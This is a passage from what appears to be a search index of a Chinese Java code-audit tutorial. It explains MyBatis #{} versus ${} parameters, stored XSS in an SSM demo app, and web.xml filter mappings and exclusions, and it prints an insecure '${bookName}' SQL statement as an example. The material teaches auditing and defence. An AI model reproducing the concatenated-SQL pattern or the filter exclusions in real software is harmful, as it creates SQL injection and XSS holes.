<li>args\uff1a\u5305\u542b\u4f20\u5165\u4ee3\u7406\u5b9e\u4f8b\u4e0a\u65b9\u6cd5\u8c03\u7528\u7684\u53c2\u6570\u503c\u7684\u5bf9\u8c61\u6570\u7ec4\uff0c\u5982\u679c\u63a5\u53e3\u65b9\u6cd5\u4e0d\u4f7f\u7528\u53c2\u6570\uff0c\u5219\u4e3a null\u3002\u57fa\u672c\u7c7b\u578b\u7684\u53c2\u6570\u88ab\u5305\u88c5\u5728\u9002\u5f53\u57fa\u672c\u5305\u88c5\u5668\u7c7b\uff08\u5982Java.lang.Integer \u6216 Java.lang.Boolean\uff09\u7684\u5b9e\u4f8b\u4e2d\u3002</li> </ul>"},{"location":"Code_audit/Java/Java-5/index.html","title":"Java EE \u5f00\u53d1\u6846\u67b6\u5b89\u5168\u5ba1\u8ba1","text":"<p>\u968f\u7740 Java Web \u6280\u672f\u7684\u4e0d\u65ad\u53d1\u5c55\uff0cJava \u5f00\u53d1 Web \u9879\u76ee\u7531\u6700\u521d\u7684\u5355\u7eaf\u4f9d\u9760 Servlet\uff08\u5728Java \u4ee3\u7801\u4e2d\u8f93\u51fa HTML\uff09\u6162\u6162\u6f14\u5316\u51fa\u4e86 JSP\uff08\u5728 HTML \u6587\u4ef6\u4e2d\u4e66\u5199 Java \u4ee3\u7801\uff09\u3002\u867d\u7136JSP \u7684\u51fa\u73b0\u5728\u5f88\u5927\u7a0b\u5ea6\u4e0a\u7b80\u5316\u4e86\u5f00\u53d1\u8fc7\u7a0b\u548c\u51cf\u5c11\u4e86\u4ee3\u7801\u91cf\uff0c\u4f46\u8fd8\u662f\u5bf9\u5f00\u53d1\u4eba\u5458\u4e0d\u591f\u53cb\u597d\uff0c\u6240\u4ee5\u6162\u6162\u5730\u53c8\u51fa\u73b0\u4e86\u4f17\u591a\u77e5\u540d\u7684\u5f00\u6e90\u6846\u67b6\uff0c\u5982 Struts2\u3001Sping\u3001Spring MVC\u3001Hibernate\u548c MyBatis \u7b49\u3002\u76ee\u524d\u5f88\u591a\u6210\u719f\u7684\u5927\u578b\u9879\u76ee\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u90fd\u4f7f\u7528\u8fd9\u4e9b\u5f00\u6e90\u6846\u67b6\uff0c\u800c\u6846\u67b6\u7684\u672c\u8d28\u662f\u5bf9\u5e95\u5c42\u4fe1\u606f\u7684\u8fdb\u4e00\u6b65\u5c01\u88c5\uff0c\u76ee\u7684\u662f\u4f7f\u5f00\u53d1\u4eba\u5458\u5c06\u66f4\u591a\u7684\u7cbe\u529b\u96c6\u4e2d\u5728\u4e1a\u52a1\u903b\u8f91\u4e2d\u3002\u9488\u5bf9\u6846\u67b6\u7684\u5ba1\u8ba1\u5219\u9700\u8981\u6211\u4eec\u5bf9\u6846\u67b6\u672c\u8eab\u7684\u6267\u884c\u6d41\u7a0b\u6709\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4e86\u89e3\uff0c\u6839\u636e\u6846\u67b6\u7684\u6267\u884c\u6d41\u7a0b\u9010\u6b65\u8ffd\u8e2a\uff0c\u4ece\u800c\u53d1\u73b0\u9690\u85cf\u5728\u9879\u76ee\u4ee3\u7801\u4e2d\u7684\u79cd\u79cd\u5b89\u5168\u9690\u60a3\u3002</p> <ul> <li>SSM \u6846\u67b6\u5ba1\u8ba1\u6280\u5de7</li> <li>\u5ba1\u8ba1\u7684\u91cd\u70b9\u2014\u2014filter \u8fc7\u6ee4\u5668</li> <li>SSM \u6846\u67b6\u5ba1\u8ba1\u601d\u8def\u603b\u7ed3</li> <li>SSH \u6846\u67b6\u5ba1\u8ba1\u6280\u5de7</li> <li>Spring Boot \u6846\u67b6\u5ba1\u8ba1\u6280\u5de7</li> <li>\u5f00\u53d1\u6846\u67b6\u4f7f\u7528\u4e0d\u5f53\u8303\u4f8b(S2-001 \u6f0f\u6d1e\u539f\u7406\u5206\u6790)</li> </ul>"},{"location":"Code_audit/Java/Java-5/SSM%20%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93.html","title":"SSM \u6846\u67b6\u5ba1\u8ba1\u601d\u8def\u603b\u7ed3","text":"<p>SSM \u6846\u67b6\u7684\u5ba1\u8ba1\u601d\u8def\u5176\u5b9e\u5c31\u662f\u4ee3\u7801\u7684\u6267\u884c\u601d\u8def\u3002</p> <p>\u4e0e\u5ba1\u8ba1\u975e SSM \u6846\u67b6\u4ee3\u7801\u7684\u4e3b\u8981\u533a\u522b\u5728\u4e8e SSM \u6846\u67b6\u7684\u5404\u79cd XML \u914d\u7f6e\uff0c\u6ce8\u89e3\u914d\u7f6e\u9700\u8981\u7528\u6237\u6839\u636e XML \u4e2d\u7684\u914d\u7f6e\u548c\u6ce8\u89e3\u6765\u67e5\u770b\u4ee3\u7801\u7684\u6267\u884c\u8def\u5f84\u3001SSM \u6846\u67b6\u4e2d\u5e38\u89c1\u7684\u6ce8\u89e3\u548c\u6ce8\u89e3\u4e2d\u7684\u5c5e\u6027\uff0c\u4ee5\u53ca\u5e38\u89c1\u7684\u6807\u7b7e\u548c\u6807\u7b7e\u7684\u5404\u4e2a\u5c5e\u6027\u3002</p> <p>\u5ba1\u8ba1\u6f0f\u6d1e\u7684\u65b9\u5f0f\u4e0e\u6b63\u5e38\u7684 Java \u4ee3\u7801\u5ba1\u8ba1\u6ca1\u6709\u533a\u522b\uff0c\u7f51\u4e0a\u6709\u5f88\u591a\u975e\u5e38\u4f18\u79c0\u7684 Java\u4ee3\u7801\u5ba1\u8ba1\u6587\u7ae0\uff0c\u5173\u4e8e\u6bcf\u4e2a\u6f0f\u6d1e\u7684\u5ba1\u8ba1\u65b9\u5f0f\u5199\u5f97\u90fd\u975e\u5e38\u5168\u9762\uff0c\u6211\u4eec\u9700\u8981\u505a\u7684\u53ea\u662f\u5c06\u5176\u79fb\u690d\u5230 SSM \u6846\u67b6\u7684\u5ba1\u8ba1\u4e2d\u6765\u3002\u660e\u767d SSM \u7684\u6267\u884c\u6d41\u7a0b\u540e\u81ea\u7136\u5c31\u660e\u767d\u600e\u6837\u5728 SSM \u6846\u67b6\u4e2d\u8ddf\u8e2a\u53c2\u6570\uff0c\u4f8b\u5982\u521a\u521a\u4ecb\u7ecd\u7684 XSS \u6f0f\u6d1e\u3002\u6211\u4eec\u6839\u636e XML \u4e2d\u7684\u914d\u7f6e\u548c\u6ce8\u89e3\u4e2d\u7684\u914d\u7f6e\u627e\u5230\u4e86 MyBatis \u7684 mapper.xml \u8fd9\u4e2a\u6620\u5c04\u6587\u4ef6\uff0c\u4ee5\u53ca\u6700\u7ec8\u6267\u884c\u7684\u4ee5\u4e0b\u547d\u4ee4\u3002</p> <pre><code>insert into ssmbuild.books(bookName,bookCounts,detail) \nvalues (#{bookName}, #{bookCounts}, #{detail})\n</code></pre> <p>\u89c2\u5bdf\u8fd9\u4e2a SQL \u8bed\u53e5\uff0c\u53d1\u73b0\u4f20\u5165\u7684 books \u53c2\u6570\u76f4\u5230 SQL \u8bed\u53e5\u6267\u884c\u7684\u524d\u4e00\u523b\u90fd\u6ca1\u6709\u7ecf\u8fc7\u4efb\u4f55\u8fc7\u6ee4\u5904\u7406\uff0c\u6240\u4ee5\u6b64\u5904\u63d2\u5165\u6570\u636e\u5e93\u7684\u53c2\u6570\u81ea\u7136\u662f\u4e0d\u53ef\u4fe1\u7684\u810f\u6570\u636e\u3002\u518d\u6b21\u67e5\u8be2\u8fd9\u6761\u6570\u636e\u5e76\u8fd4\u56de\u5230\u524d\u7aef\u65f6\u5c31\u975e\u5e38\u53ef\u80fd\u9020\u6210\u5b58\u50a8\u578b XSS \u653b\u51fb\u3002</p> <p>\u5728\u5ba1\u8ba1\u8fd9\u7c7b\u6f0f\u6d1e\u65f6\uff0c\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u5148\u5728 web.xml \u4e2d\u67e5\u770b\u6709\u6ca1\u6709\u914d\u7f6e\u76f8\u5173\u7684\u8fc7\u6ee4\u5668\uff0c\u5982\u679c\u6709\u5219\u67e5\u770b\u8fc7\u6ee4\u5668\u7684\u89c4\u5219\u662f\u5426\u4e25\u683c\uff0c\u5982\u679c\u6ca1\u6709\u5219\u5f88\u6709\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e\u3002</p> <p>\u6700\u540e\u8865\u5145\u4e00\u4e0b MyBaits \u4e2d\u7684\u9884\u7f16\u8bd1\u77e5\u8bc6\u3002\u5728\u975e\u9884\u7f16\u8bd1\u7684\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u6bcf\u6b21\u6267\u884cSQL \u90fd\u9700\u8981\u5c06 SQL \u548c\u53c2\u6570\u62fc\u63a5\u5728\u4e00\u8d77\uff0c\u7136\u540e\u4f20\u9012\u7ed9\u6570\u636e\u5e93\u7f16\u8bd1\u6267\u884c\uff0c\u8fd9\u79cd\u91c7\u7528\u62fc\u63a5\u7684\u65b9\u5f0f\u975e\u5e38\u5bb9\u6613\u4ea7\u751f SQL \u6ce8\u5165\u6f0f\u6d1e\uff0c\u7528\u6237\u53ef\u4ee5\u4f7f\u7528 filter \u5bf9\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\u6765\u907f\u514d\u4ea7\u751fSQL \u6ce8\u5165\u3002</p> <p>\u800c\u5728\u9884\u7f16\u8bd1\u7684\u60c5\u51b5\u4e0b\uff0c\u7a0b\u5e8f\u4f1a\u63d0\u524d\u5c06 SQL \u8bed\u53e5\u7f16\u8bd1\u597d\uff0c\u7a0b\u5e8f\u6267\u884c\u65f6\u53ea\u9700\u8981\u5c06\u4f20\u9012\u8fdb\u6765\u7684\u53c2\u6570\u4ea4\u7531\u6570\u636e\u5e93\u8fdb\u884c\u64cd\u4f5c\u5373\u53ef\u3002\u6b64\u65f6\u4e0d\u8bba\u4f20\u9012\u8fdb\u6765\u7684\u53c2\u6570\u662f\u4ec0\u4e48\uff0c\u90fd\u4e0d\u4f1a\u88ab\u5f53\u4f5c SQL \u8bed\u53e5\u7684\u4e00\u90e8\u5206\uff0c\u56e0\u4e3a\u771f\u6b63\u7684 SQL \u8bed\u53e5\u5df2\u7ecf\u63d0\u524d\u88ab\u7f16\u8bd1\u597d\u4e86\uff0c\u6240\u4ee5\u5373\u4f7f\u4e0d\u8fc7\u6ee4\u4e5f\u4e0d\u4f1a\u4ea7\u751f SQL \u6ce8\u5165\u8fd9\u7c7b\u6f0f\u6d1e\uff0c\u4ee5\u4e0b\u9762 mapper.xml \u4e2d\u7684 SQL \u8bed\u53e5\u4e3a\u4f8b\u3002</p> <pre><code>insert into ssmbuild.books(bookName,bookCounts,detail) \nvalues (#{bookName}, #{bookCounts}, #{detail})\n</code></pre>"},{"location":"Code_audit/Java/Java-5/SSM%20%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93.html#bookname","title":"{bookName}\u8fd9\u79cd\u5f62\u5f0f\u5c31\u662f\u91c7\u7528\u4e86\u9884\u7f16\u8bd1\u7684\u5f62\u5f0f\u4f20\u53c2\u3002","text":"<pre><code>insert into ssmbuild.books(bookName,bookCounts,detail) \nvalues ('${bookName}','${bookCounts}', '${detail}')\n</code></pre> <pre><code>\u800c'${bookName}'\u8fd9\u79cd\u5199\u6cd5\u6ca1\u6709\u4f7f\u7528\u9884\u7f16\u8bd1\u7684\u5f62\u5f0f\u4f20\u9012\u53c2\u6570\uff0c\u6b64\u65f6\u5982\u679c\u4e0d\u5bf9\u4f20\u5165\n\u7684\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\u548c\u6821\u9a8c\uff0c\u5c31\u4f1a\u4ea7\u751f SQL \u6ce8\u5165\u6f0f\u6d1e\uff0c'${xxxx}'\u548c#{xxxx}\u5176\u5b9e\u5c31\u662f JDBC\n\u7684 Statement \u548c PreparedStatement \u5bf9\u8c61\u3002\n</code></pre>"},{"location":"Code_audit/Java/Java-5/Filter/index.html","title":"filter \u8fc7\u6ee4\u5668","text":"<p>\u4e0b\u9762\u5185\u5bb9\u4ecb\u7ecdweb.xml\u6587\u4ef6\u4e2d\u7684<code>&lt;filter&gt;</code>\u6807\u7b7e\u3002</p> <p>Spring MVC \u662f\u6784\u5efa\u4e8e Servlet \u4e4b\u4e0a\u7684\uff0c\u6240\u4ee5 Servlet \u4e2d\u7684\u8fc7\u6ee4\u5668\u81ea\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u80fd\u914d\u7f6e\u5728 spring-mvc.xml \u4e2d\uff0c\u800c\u662f\u8981\u76f4\u63a5\u914d\u7f6e\u5728 web.xml \u4e2d\uff0c\u56e0\u4e3a\u5b83\u662f\u5c5e\u4e8eServlet \u7684\u6280\u672f\u3002</p> <p>\u91cd\u65b0\u67e5\u770b web.xml \u6587\u4ef6\uff0c\u5982\u56fe</p> <p></p> <p>\u5728\u524d\u9762\u7684\u8bb2\u89e3\u4e2d\u5c06\u8fd9\u4e24\u4e2a filter \u8fdb\u884c\u4e86\u6ce8\u91ca\uff0c\u56e0\u6b64\u8fd9\u4e24\u4e2a filter \u5e76\u6ca1\u6709\u751f\u6548\u3002\u6211\u4eec\u4ee5\u4e0b\u9762\u7684 filter-name \u4e3a <code>XSSEscape</code> \u7684 filter \u6765\u8fdb\u884c\u8bb2\u89e3\u3002 \u9996\u5148\uff0c\u6b64\u65f6\u7a0b\u5e8f\u662f\u6ca1\u6709 XSS \u9632\u62a4\u7684\uff0c\u6240\u4ee5\u5b58\u5728\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\uff0c\u6211\u4eec\u6765\u5c1d\u8bd5\u5b58\u50a8\u578b XSS \u653b\u51fb\uff0c\u5982\u56fe</p> <p></p> <p>\u5355\u51fb\u65b0\u589e\u529f\u80fd\uff0c\u5982\u56fe</p> <p></p> <p>\u67e5\u770b\u63d0\u4ea4\u8def\u5f84\uff0c\u5982\u56fe</p> <p></p> <p>\u53bb\u540e\u53f0\u5bfb\u627e\u4e0e\u4e4b\u5bf9\u5e94\u7684\u65b9\u6cd5\uff0c\u5982\u56fe</p> <p></p> <p>\u627e\u5230\u540e\u5728\u8fd9\u91cc\u8bbe\u7f6e\u65ad\u70b9\uff0c\u67e5\u770b\u4f20\u5165\u53c2\u6570\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5982\u56fe</p> <p></p> <p>XSS \u8bed\u53e5\u5728\u672a\u7ecf\u4efb\u4f55\u8fc7\u6ee4\u76f4\u63a5\u4f20\u5165\uff0c\u5982\u56fe</p> <p></p> <p>\u6b64\u65f6\u53ef\u4ee5\u5728 web.xml \u4e2d\u914d\u7f6e\u9632\u5fa1 XSS \u653b\u51fb\uff0c\u5982\u56fe <p></p> <p>\u8fd9\u91cc\u58f0\u660e\u4e86com.ssm_project.filter\u7684\u5305\u8def\u5f84\u4e0b\u53c8\u4e00\u4e2a\u7c7bXssFilter\uff0c\u5b83\u662f\u4e00\u4e2a\u8fc7\u6ee4\u5668\u3002</p> <p>\u4e0b\u9762\u7684<code>&lt;dispatcher&gt;</code>\u5c5e\u6027\u4e2d\u7684 REQUEST \u7684\u610f\u601d\u662f\u53ea\u8981\u53d1\u8d77\u7684\u64cd\u4f5c\u662f\u4e00\u6b21 HTTP\u8bf7\u6c42\uff0c\u6bd4\u5982\u8bf7\u6c42\u67d0\u4e2a URL\u3001\u53d1\u8d77\u4e00\u4e2a GET \u8bf7\u6c42\u3001\u8868\u5355\u63d0\u4ea4\u65b9\u5f0f\u4e3a POST \u7684 POST \u8bf7\u6c42\u3001\u8868\u5355\u63d0\u4ea4\u65b9\u5f0f\u4e3a GET \u7684 GET \u8bf7\u6c42\u3002\u4e00\u6b21\u91cd\u5b9a\u5411\u5219\u76f8\u5f53\u4e8e\u524d\u540e\u53d1\u8d77\u4e86\u4e24\u6b21\u8bf7\u6c42\uff0c\u8fd9\u4e9b\u60c5\u51b5\u4e0b\u6709\u51e0\u6b21\u8bf7\u6c42\u5c31\u4f1a\u7ecf\u8fc7\u51e0\u6b21\u6307\u5b9a\u8fc7\u6ee4\u5668\u3002</p> <p><code>&lt;dispatcher&gt;</code>\u5c5e\u6027 2.4 \u7248\u672c\u7684 Servlet \u4e2d\u6dfb\u52a0\u7684\u65b0\u7684\u5c5e\u6027\u6807\u7b7e\u603b\u5171\u6709 4 \u4e2a\u503c\uff0c\u5206\u522b\u662f REQUEST\u3001FORWARD\u3001INCLUDE \u548c ERROR\uff0c\u4ee5\u4e0b\u5bf9\u8fd9 4 \u4e2a\u503c\u8fdb\u884c\u7b80\u5355\u8bf4\u660e\u3002</p> <pre><code>\uff081\uff09REQUEST\u3002\n\u53ea\u8981\u53d1\u8d77\u7684\u64cd\u4f5c\u662f\u4e00\u6b21 HTTP \u8bf7\u6c42\uff0c\u6bd4\u5982\u8bf7\u6c42\u67d0\u4e2a URL\u3001\u53d1\u8d77\u4e00\u4e2a GET \u8bf7\u6c42\u3001\u8868\u5355\u63d0\u4ea4\u65b9\u5f0f\u4e3a POST \u7684 POST \u8bf7\u6c42\u3001\u8868\u5355\u63d0\u4ea4\u65b9\u5f0f\u4e3a GET \u7684 GET \u8bf7\u6c42\uff0c\u5c31\u4f1a\u7ecf\u8fc7\u6307\u5b9a\u7684\u8fc7\u6ee4\u5668\u3002\n\uff082\uff09FORWARD\u3002\n\u53ea\u6709\u5f53\u5f53\u524d\u9875\u9762\u662f\u901a\u8fc7\u8bf7\u6c42\u8f6c\u53d1\u8fc7\u6765\u7684\u60c5\u5f62\u65f6\uff0c\u624d\u4f1a\u7ecf\u8fc7\u6307\u5b9a\u7684\u8fc7\u6ee4\u5668\u3002\n\uff083\uff09INCLUDE\u3002\n\u53ea\u8981\u662f\u901a\u8fc7&lt;jsp:include page=\"xxx.jsp\" /&gt;\u5d4c\u5165\u7684\u9875\u9762\uff0c\u6bcf\u5d4c\u5165\u4e00\u4e2a\u9875\u9762\u90fd\u4f1a\u7ecf\u8fc7\u4e00\u6b21\u6307\u5b9a\u7684\u8fc7\u6ee4\u5668\u3002\n\uff084\uff09ERROR\u3002\n\u5047\u5982 web.xml \u4e2d\u914d\u7f6e\u4e86&lt;error-page&gt;&lt;/error-page&gt;\uff0c\u5982\u4e0b\u6240\u793a\u3002\n&lt;error-page&gt; \n&lt;error-code&gt;400&lt;/error-code&gt; \n&lt;location&gt;/filter/error.jsp&lt;/location&gt; \n&lt;/error-page&gt;\n\u610f\u601d\u662f HTTP \u8bf7\u6c42\u54cd\u5e94\u7684\u72b6\u6001\u7801\u53ea\u8981\u662f 400\u3001404\u3001500 \u8fd9 3 \u79cd\u72b6\u6001\u7801\u4e4b\u4e00\uff0c\u5bb9\u5668\u5c31\u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230 error.jsp \u4e0b\uff0c\u8fd9\u5c31\u89e6\u53d1\u4e86\u4e00\u6b21 error\uff0c\u7ecf\u8fc7\u914d\u7f6e\u7684 DispatchFilter\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u867d\u7136\u628a\u8bf7\u6c42\u8f6c\u53d1\u5230 error.jsp \u662f\u4e00\u6b21 forward \u7684\u8fc7\u7a0b\uff0c\u4f46\u662f\u914d\u7f6e\u6210&lt;dispatcher&gt;FORWARD&lt;/dispatcher&gt;\u5e76\u4e0d\u4f1a\u7ecf\u8fc7 DispatchFilter \u8fc7\u6ee4\u5668\u3002\n</code></pre> <p>\u8fd94\u79cddispatcher\u65b9\u5f0f\u53ef\u4ee5\u5355\u72ec\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528\uff0c\u53ea\u9700\u914d\u7f6e\u591a\u4e2a<code>&lt;dispatcher&gt; &lt;/dispatcher&gt;</code>\u5373\u53ef\u3002</p> <p>\u5ba1\u8ba1\u65f6\u7684\u8fc7\u6ee4\u5668 <code>&lt;dispatcher&gt;</code> \u5c5e\u6027\u4e2d\u4f7f\u7528\u7684\u503c\u4e5f\u662f\u6211\u4eec\u5173\u6ce8\u7684\u4e00\u4e2a\u70b9\u3002<code>&lt;url-pattern&gt;</code>\u5c5e\u6027\u4f1a\u6307\u660e\u6211\u4eec\u8981\u8fc7\u6ee4\u8bbf\u95ee\u54ea\u4e9b\u8d44\u6e90\u7684\u8bf7\u6c42\uff0c\u201c/*\u201d\u7684\u610f\u601d\u662f\u62e6\u622a\u6240\u6709\u5bf9\u540e\u53f0\u7684\u8bf7\u6c42, \u5305\u62ec\u4e00\u4e2a\u7b80\u5355\u7684\u5bf9 JSP \u9875\u9762\u7684 GET \u8bf7\u6c42\u3002\u540c\u65f6\u6211\u4eec\u53ef\u4ee5\u5177\u4f53\u5730\u6307\u5b9a\u62e6\u622a\u5bf9\u67d0\u4e00\u8d44\u6e90\u7684\u8bf7\u6c42\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u5bf9\u67d0\u4e9b\u8d44\u6e90\u7684\u8bf7\u6c42\u4e0d\u8fdb\u884c\u8fc7\u6ee4\u800c\u5355\u72ec\u653e\u8fc7.</p> <p>\u793a\u4f8b\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>&lt;filter&gt; \n&lt;filter-name&gt;XSSEscape&lt;/filter-name&gt; \n&lt;filter-class&gt;com.springtest.filter.XssFilter&lt;/filter-class&gt; \n&lt;/filter&gt; \n&lt;filter-mapping&gt; \n&lt;filter-name&gt;XSSEscape&lt;/filter-name&gt; \n&lt;url-pattern&gt;/com/app/UserControl&lt;/url-pattern&gt; \n&lt;dispatcher&gt;REQUEST&lt;/dispatcher&gt; \n&lt;/filter-mapping&gt;\n</code></pre> <p>\u65e2\u7136\u80fd\u591f\u6307\u5b9a\u5355\u72ec\u8fc7\u6ee4\u7279\u5b9a\u8d44\u6e90\uff0c\u81ea\u7136\u4e5f\u5c31\u53ef\u4ee5\u6307\u5b9a\u653e\u884c\u7279\u5b9a\u8d44\u6e90\u3002</p> <p>\u8bbe\u7f6e\u5bf9\u5168\u5c40\u8d44\u6e90\u8bf7\u6c42\u8fc7\u6ee4\u80af\u5b9a\u662f\u4e0d\u5408\u7406\u7684\u3002\u751f\u4ea7\u73af\u5883\u4e2d\u6709\u5f88\u591a\u9759\u6001\u8d44\u6e90\u4e0d\u9700\u8981\u8fdb\u884c\u8fc7\u6ee4\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6307\u5b9a\u5c06\u8fd9\u4e9b\u8d44\u6e90\u8fdb\u884c\u653e\u884c\uff0c\u793a\u4f8b\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>&lt;filter&gt; \n&lt;filter-name&gt; XSSEscape &lt;/filter-name&gt; \n&lt;filter-class&gt; com.springtest.filter.XssFilter &lt;/filter-class&gt; \n&lt;init-param&gt; \n&lt;!-- \u914d\u7f6e\u4e0d\u9700\u8981\u88ab\u767b\u5f55\u8fc7\u6ee4\u5668\u62e6\u622a\u7684\u94fe\u63a5\uff0c\u53ea\u652f\u6301\u914d\u540e\u7f00\u3001\u524d\u7f00\u53ca\u5168\u8def\u5f84\uff0c\u591a\u4e2a\u914d\u7f6e\u7528\u9017\u53f7\u5206\u9694 --&gt; \n&lt;param-name&gt;excludedPaths&lt;/param-name&gt; \n&lt;param-value&gt;/pages/*,*.html,*.js,*.ico&lt;/param-value\\&gt; \n&lt;/init-param&gt; \n&lt;/filter&gt; \n&lt;filter-mapping&gt; \n&lt;filter-name&gt; XSSEscape &lt;/filter-name&gt; \n&lt;url-pattern&gt;/*&lt;/url-pattern&gt; \n&lt;/filter-mapping&gt;\n</code></pre> <p>\u8fd9\u6837\u914d\u7f6e\u540e\uff0c\u5982\u679c\u6709\u5bf9 html\u3001js \u548c ico \u8d44\u6e90\u53d1\u8d77\u7684\u8bf7\u6c42\uff0cSerlvet \u5728\u8def\u5f84\u9009\u62e9\u65f6\u5c31\u4e0d\u4f1a\u5c06\u8be5\u8bf7\u6c42\u8f6c\u53d1\u81f3 XssFilter \u7c7b\u3002</p> <p>\u5728\u5ba1\u8ba1\u4ee3\u7801\u65f6\uff0c\u8fd9\u4e5f\u662f\u9700\u8981\u6ce8\u610f\u7684\u4e00\u4e2a\u70b9\uff0c\u56e0\u4e3a\u5f00\u53d1\u4eba\u5458\u7684\u9519\u8bef\u914d\u7f6e\u6709\u53ef\u80fd\u5bfc\u81f4\u672c\u5e94\u8be5\u7ecf\u8fc7\u8fc7\u6ee4\u5668\u7684\u8bf7\u6c42\u5374\u88ab\u76f4\u63a5\u653e\u884c\uff0c\u4ece\u800c\u4f7f\u9879\u76ee\u4e2d\u7684\u8fc7\u6ee4\u5668\u5931\u6548\u3002</p> <p>\u4e86\u89e3\u6807\u7b7e\u7684\u4f5c\u7528\u540e\uff0c\u67e5\u770b XssFilter \u7c7b\u7684\u5185\u5bb9\uff0c\u5982\u56fe <p></p> <p>\u53ef\u4ee5\u770b\u5230 filter \u5305\u4e0b\u6709\u4e24\u4e2a Java \u7c7b\uff0c\u5148\u6765\u67e5\u770b XssFilter \u7c7b\uff0c\u5982\u56fe</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230 XssFilter \u7c7b\u5b9e\u73b0\u4e86\u4e00\u4e2a Filter \u63a5\u53e3\u3002\u67e5\u770b Filter \u63a5\u53e3\u7684\u6e90\u7801\uff0c\u5982\u56fe</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230 Filter \u6240\u5c5e\u7684\u5305\u662f javax.servlet\u3002Filter \u662f Servlet \u7684\u4e09\u5927\u7ec4\u4ef6\u4e4b\u4e00\uff0cjavax.servlet.Filter \u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u5176\u4e3b\u8981\u4f5c\u7528\u662f \u8fc7\u6ee4\u8bf7\u6c42\uff0c\u5b9e\u73b0\u8bf7\u6c42\u7684\u62e6\u622a\u6216\u8005\u653e\u884c\uff0c\u5e76\u4e14\u6dfb\u52a0\u65b0\u7684\u529f\u80fd\u3002</p> <p>\u4f17\u6240\u5468\u77e5\uff0c\u63a5\u53e3\u5176\u5b9e\u662f\u4e00\u4e2a\u6807\u51c6\uff0c\u6240\u4ee5\u6211\u4eec\u60f3\u8981\u7f16\u5199\u81ea\u5df1\u7684\u8fc7\u6ee4\u5668\uff0c\u81ea\u7136\u4e5f\u8981\u9075\u5b88\u8fd9\u4e2a\u6807\u51c6\uff0c\u5373\u5b9e\u73b0 Filter \u63a5\u53e3\u3002</p> <p>Filter \u63a5\u53e3\u4e2d\u6709 3 \u4e2a\u65b9\u6cd5\uff0c\u8fd9\u91cc\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002</p> <pre><code>\u25cf init \u65b9\u6cd5\uff1a\u5728\u521b\u5efa\u5b8c\u8fc7\u6ee4\u5668\u5bf9\u8c61\u4e4b\u540e\u88ab\u8c03\u7528\u3002\u53ea\u6267\u884c\u4e00\u6b21\u3002\n\u25cf doFilter \u65b9\u6cd5\uff1a\u6267\u884c\u8fc7\u6ee4\u4efb\u52a1\u65b9\u6cd5\u3002\u6267\u884c\u591a\u6b21\u3002\n\u25cf destroy \u65b9\u6cd5\uff1aWeb \u670d\u52a1\u5668\u505c\u6b62\u6216\u8005 Web \u5e94\u7528\u91cd\u65b0\u52a0\u8f7d\uff0c\u9500\u6bc1\u8fc7\u6ee4\u5668\u5bf9\u8c61\u3002\n</code></pre> <p>\u5f53 Servlet \u5bb9\u5668\u5f00\u59cb\u8c03\u7528\u67d0\u4e2a Servlet \u7a0b\u5e8f\u65f6\uff0c\u5982\u679c\u53d1\u73b0\u5df2\u7ecf\u6ce8\u518c\u4e86\u4e00\u4e2a Filter \u7a0b\u5e8f\u6765\u5bf9\u8be5 Servlet \u8fdb\u884c\u62e6\u622a\uff0c\u90a3\u4e48\u5bb9\u5668\u4e0d\u518d\u76f4\u63a5\u8c03\u7528 Servlet \u7684 service \u65b9\u6cd5\uff0c\u800c\u662f\u8c03\u7528 Filter \u7684 doFilter \u65b9\u6cd5\uff0c\u518d\u7531 doFilter \u65b9\u6cd5\u51b3\u5b9a\u662f\u5426\u6fc0\u6d3b service \u65b9\u6cd5\u3002</p> <p>\u4e0d\u96be\u770b\u51fa\uff0c\u9700\u8981\u6211\u4eec\u91cd\u70b9\u5173\u6ce8\u7684\u65b9\u6cd5\u662f doFilter \u65b9\u6cd5\uff0c\u5982\u56fe</p> <p></p> <p>\u8fd9\u91cc\u7684 request \u53c2\u6570\u548c response \u53c2\u6570\u53ef\u4ee5\u7406\u89e3\u4e3a\u5c01\u88c5\u4e86\u8bf7\u6c42\u6570\u636e\u548c\u54cd\u5e94\u6570\u636e\u7684\u5bf9\u8c61\uff0c\u9700\u8981\u8fc7\u6ee4\u7684\u6570\u636e\u5b58\u653e\u5728\u8fd9\u4e24\u4e2a\u5bf9\u8c61\u4e2d\u3002</p> <p>\u5bf9\u4e8e\u6700\u540e\u4e00\u4e2a\u53c2\u6570 FilterChain\uff0c\u901a\u8fc7\u540d\u79f0\u53ef\u4ee5\u731c\u6d4b\u8fd9\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u8fc7\u6ee4\u94fe\u3002\u67e5\u770bFilterChain \u7684\u6e90\u7801\uff0c\u5982\u56fe</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0 FilterChain \u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u800c\u4e14\u8be5\u63a5\u53e3\u53ea\u6709\u4e00\u4e2a doFilter 